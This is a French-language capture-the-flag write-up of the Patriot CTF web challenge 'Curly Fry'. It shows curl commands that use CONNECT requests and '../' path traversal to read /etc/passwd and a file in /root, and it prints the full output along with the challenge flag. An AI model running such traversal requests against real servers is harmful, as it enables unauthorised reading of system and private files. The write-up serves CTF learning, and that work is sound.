# Patriot CTF

## Web

### Curly Fry

**Enoncé :** Qui a besoin de Flask quand vous avez Golang -- la nouvelle méta pour les applications web.

Jetez un coup d'oeil à ce site web super élégant et fonctionnel.

Le challenge nous donne l'URL suivante : `chal2.pctf.competitivecyber.club:49515`

***

A la connexion sur cet URL, on tombe sur la page index.hmtl avec le code source suivant :

```html
<html>
  <head>
    <title>Curly Fry</title>
  </head>
  <body>
    <h2>I will release my secret curly fry recipe when I am ready. For now it is safely held in my /root directory</h2>
  </body>
</html>
```

Il est possible d'accéder a des ressources non-autorisée grâce à une requête CONNECT.

J'essaye dans un premier temps d'accéder au fichier **/etc/passwd** via curl : `curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../..
/etc/passwd`

Via la requête, j'accède bien au fichier souhaité :

``` 
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```



```
curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../../root/recipe.txt
Ingredients: for 2 servings
- 2 curly potatoes
- 2 tablespoons of old bay seasoning
- ketchup and malt vinegar

Preparation
1. Preheat oven to 420°F
2. Slice the potatoes with a knife as they are already curly to begin with
3. Put your seasoning on em
4. Just throw them into the oven
5. Bake until they look good, idk.
6. Put ketchup on a plate and stir in a little malt vinegar
7. Enjoy!
8. Get flag: PCTF{tru5t_m3_im_4_ch3f}
```


![image](https://user-images.githubusercontent.com/49941629/166076085-f02a43e6-9399-4db3-8d96-3adb3dd3e5fc.png)


![image](https://user-images.githubusercontent.com/49941629/166076128-1acaa89b-ad4e-4c55-900e-5062165d01f0.png)

![image](https://user-images.githubusercontent.com/49941629/166076146-30bb3dff-12a2-4c41-b867-73f19eb2b62b.png)
